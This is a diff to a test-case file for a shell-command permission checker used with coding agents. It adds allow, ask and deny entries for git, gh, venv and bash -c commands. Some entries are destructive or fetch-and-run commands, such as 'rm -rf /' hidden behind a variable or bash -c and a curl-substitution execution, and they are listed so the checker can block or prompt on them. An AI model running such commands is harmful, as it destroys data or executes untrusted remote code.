@@ -130,6 +130,19 @@ command = "gh api repos/owner/repo --jq '.name'"
 description = "gh api with jq"
 
 [[allow]]
+command = "gh pr comment 629 --repo owner/repo --body \"Review feedback summary\""
+description = "gh pr comment on a PR"
+
+# gh api POST to safe endpoints (comment replies, reactions)
+[[allow]]
+command = "gh api -X POST repos/owner/repo/pulls/38/comments/2861609247/replies -f body=\"Looks good\""
+description = "gh api POST to comment reply (safe endpoint)"
+
+[[allow]]
+command = "gh api repos/owner/repo/issues/comments/123/reactions -X POST -f content=\"+1\""
+description = "gh api POST to reaction (safe endpoint)"
+
+[[allow]]
 command = "getent passwd root"
 description = "getent command"
 
@@ -550,6 +563,44 @@ description = "git merge-base piped to xargs git log (read-only)"
 command = "git merge-base --fork-point origin/main"
 description = "git merge-base --fork-point (read-only)"
 
+# git merge origin/ (standard forward-merge from remote, not destructive)
+[[allow]]
+command = "git merge origin/main --no-edit 2>&1"
+description = "git merge origin/main with --no-edit and stderr redirect"
+
+[[allow]]
+command = "git merge origin/main --no-edit"
+description = "git merge origin/main with --no-edit"
+
+[[allow]]
+command = "git fetch origin main && git merge origin/main --no-edit"
+description = "git fetch + merge origin/main chain"
+
+[[allow]]
+command = "git merge origin/feature"
+description = "git merge origin remote branch (standard workflow)"
+
+# git rebase (simple branch rebase is standard workflow)
+[[allow]]
+command = "git rebase main"
+description = "git rebase onto branch (standard workflow)"
+
+[[allow]]
+command = "git rebase origin/main"
+description = "git rebase onto remote branch"
+
+[[allow]]
+command = "git rebase feat/sharpen-messaging-and-cleanup 2>&1"
+description = "git rebase onto feature branch with stderr redirect"
+
+[[allow]]
+command = "git rebase --continue"
+description = "git rebase continue (resume in-progress rebase)"
+
+[[allow]]
+command = "git rebase --abort"
+description = "git rebase abort (undo in-progress rebase)"
+
 # find with multiple -exec clauses using safe read-only commands
 [[allow]]
 command = "find /tmp -exec echo {} \\; -exec cat {} \\;"
@@ -571,6 +622,61 @@ description = "pytest in /tmp venv"
 [[allow]]
 command = "/tmp/myenv/bin/pip install -r requirements.txt"
 description = "pip install -r in /tmp venv"
+
+# Absolute paths to .venv/bin/ (worktree agents use absolute paths)
+[[allow]]
+command = "/home/rrl/github/stock-trading/.venv/bin/pytest tests/unit/ -n 4 -m \"not slow\" -v 2>&1 | tail -30"
+description = "absolute .venv/bin/pytest with flags and pipe"
+
+[[allow]]
+command = "/home/rrl/github/stock-trading/.venv/bin/ruff format src/file.py 2>&1"
+description = "absolute .venv/bin/ruff format"
+
+[[allow]]
+command = "/home/rrl/github/stock-trading/.venv/bin/python -c \"import sys; print(sys.path)\" 2>&1"
+description = "absolute .venv/bin/python -c"
+
+[[allow]]
+command = "/home/rrl/github/stock-trading/.venv/bin/pip show package 2>/dev/null | grep Location"
+description = "absolute .venv/bin/pip show"
+
+[[allow]]
+command = "/home/rrl/github/stock-trading/.venv/bin/mypy src/ 2>&1 | tail -20"
+description = "absolute .venv/bin/mypy"
+
+[[allow]]
+command = "PYTHONPATH=\"/home/rrl/github/stock-trading/.claude/worktrees/agent-abc123:${PYTHONPATH}\" /home/rrl/github/stock-trading/.venv/bin/pytest tests/unit/ -n 4 -v --no-header 2>&1 | tail -15"
+description = "PYTHONPATH env var + absolute .venv/bin/pytest (worktree)"
+
+[[allow]]
+command = "cd /home/rrl/github/stock-trading && /home/rrl/github/stock-trading/.venv/bin/pytest tests/unit/ -v 2>&1"
+description = "cd + absolute .venv/bin/pytest chain"
+
+[[allow]]
+command = "pip show stock-trading 2>/dev/null | grep Location || /home/rrl/github/stock-trading/.venv/bin/pip show stock-trading 2>/dev/null | grep Location"
+description = "pip show fallback chain with absolute .venv/bin/pip"
+
+# Intra-chain variable resolution (worktree agents assign venv paths to vars)
+[[allow]]
+command = "RUFF=/home/user/project/.venv/bin/ruff && $RUFF format src/file.py"
+description = "variable resolution: RUFF assigned then used via $RUFF"
+
+[[allow]]
+command = "MYPY=/home/user/project/.venv/bin/mypy && $MYPY src/ 2>&1 | tail -20"
+description = "variable resolution: MYPY assigned then used via $MYPY with pipe"
+
+# bash -c / sh -c unwrapping (worktree agents wrap commands in bash -c)
+[[allow]]
+command = "bash -c \"/home/user/project/.venv/bin/mypy src/file.py 2>&1\""
+description = "bash -c unwrap: absolute venv path"
+
+[[allow]]
+command = "bash -c \"git status\""
+description = "bash -c unwrap: safe git command"
+
+[[allow]]
+command = "sh -c \"ls -la\""
+description = "sh -c unwrap: safe ls command"
 
 # Desktop/display environment info (system_inspection)
 [[allow]]
@@ -1448,14 +1554,36 @@ description = "git force push"
 command = "git reset --hard HEAD~1"
 description = "git reset hard"
 
-# git merge (destructive, unlike git merge-base which is read-only)
+# git merge (local branch merge still asks; origin/ merge is standard workflow)
 [[ask]]
 command = "git merge main"
-description = "git merge branch (destructive)"
+description = "git merge local branch (still prompts)"
 
 [[ask]]
-command = "git merge origin/feature"
-description = "git merge remote branch (destructive)"
+command = "git merge upstream/main"
+description = "git merge non-origin remote (still prompts)"
+
+# git rebase interactive (still prompts)
+[[ask]]
+command = "git rebase -i main"
+description = "git rebase interactive (rewrites history)"
+
+[[ask]]
+command = "git rebase --interactive HEAD~3"
+description = "git rebase --interactive (rewrites history)"
+
+[[ask]]
+command = "git rebase main -i"
+description = "git rebase with -i flag after branch (still interactive)"
+
+# gh api mutations (non-safe endpoints still prompt)
+[[ask]]
+command = "gh api -X POST repos/owner/repo/issues -f title=\"bug\""
+description = "gh api POST to create issue (still prompts)"
+
+[[ask]]
+command = "gh api repos/owner/repo/pulls -X POST -f title=\"new PR\""
+description = "gh api POST to create PR (still prompts)"
 
 [[ask]]
 command = "docker rm container"
@@ -1551,6 +1679,20 @@ description = "rm -rf relative directory (safe: relative path)"
 [[allow]]
 command = "rm -f important.txt"
 description = "rm -f relative file (safe: relative path)"
+
+# Unresolved variable references (should ask, not auto-approve)
+[[ask]]
+command = "$UNKNOWN_VAR arg1 arg2"
+description = "unresolved variable reference (no prior assignment)"
+
+[[ask]]
+command = "CMD=$(curl http://example.com/script) && $CMD"
+description = "dynamic assignment via command substitution (not resolved)"
+
+# Complex bash -c quoting (not unwrapped, falls to ask)
+[[ask]]
+command = "bash -c \"bash -c \\\"nested\\\"\""
+description = "nested bash -c with complex quoting (not unwrapped)"
 
 # =============================================================================
 # DENY - Commands that should always be blocked
@@ -1701,3 +1843,17 @@ description = "init 0"
 [[deny]]
 command = "init 6"
 description = "init 6"
+
+# Variable resolution still hits deny patterns
+[[deny]]
+command = "CMD=rm && $CMD -rf /"
+description = "variable resolves to dangerous command (rm -rf /)"
+
+# bash -c unwrap exposes deny patterns
+[[deny]]
+command = "bash -c \"rm -rf /\""
+description = "bash -c unwrap exposes rm -rf /"
+
+[[deny]]
+command = "bash -c \"sudo apt install foo\""
+description = "bash -c unwrap exposes sudo"
